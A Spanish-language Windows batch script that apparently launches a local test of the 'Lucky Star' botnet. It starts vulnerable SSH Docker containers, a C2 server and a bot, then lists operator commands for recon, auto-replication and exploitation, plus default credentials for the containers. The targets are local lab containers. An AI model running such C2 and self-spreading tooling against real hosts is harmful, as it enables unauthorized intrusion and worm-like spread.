@echo off
cd /d "%~dp0"

echo ========================================
echo   LUCKY STAR - PRUEBA RAPIDA
echo ========================================
echo.

echo [1/5] Verificando contenedores Docker...
docker ps | findstr vulnerable_ssh >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo [!] Contenedores no estan corriendo
    echo [*] Iniciando contenedores...
    docker-compose -f docker-vulnerable-ssh.yml up -d
    timeout /t 15 /nobreak >nul
)

echo [2/5] Verificando puertos Docker...
echo [*] Probando conectividad a contenedores...
powershell -Command "Test-NetConnection -ComputerName localhost -Port 2201 -WarningAction SilentlyContinue | Select-Object TcpTestSucceeded"

echo.
echo [3/5] Verificando certificados SSL...
if not exist "cert.pem" (
    echo [*] Generando certificados...
    python generate_certs.py
)

echo.
echo [4/5] Iniciando C2 Server...
start "Lucky Star C2" cmd /k "python c2_commander.py"
timeout /t 3 /nobreak >nul

echo.
echo [5/5] Iniciando Bot...
start "Lucky Star Bot" cmd /k "python bot_soldier.py"

echo.
echo ========================================
echo   SISTEMA INICIADO
echo ========================================
echo.
echo [*] C2 Server: Esperando bots...
echo [*] Bot: Conectandose al C2...
echo.
echo PASOS SIGUIENTES:
echo.
echo 1. Espera a que el bot se conecte (5-10 seg)
echo 2. En C2, ejecuta: recon 1
echo 3. Espera el escaneo (15-30 seg)
echo 4. Verifica hosts: list 1
echo 5. Activa auto-rep: auto_rep 1 on
echo 6. Explota: exploit 1 1
echo.
echo Deberias ver 3 contenedores Docker:
echo   - 127.0.0.1:2201 (admin:admin)
echo   - 127.0.0.1:2202 (test:test)
echo   - 127.0.0.1:2203 (root:root)
echo.
pause
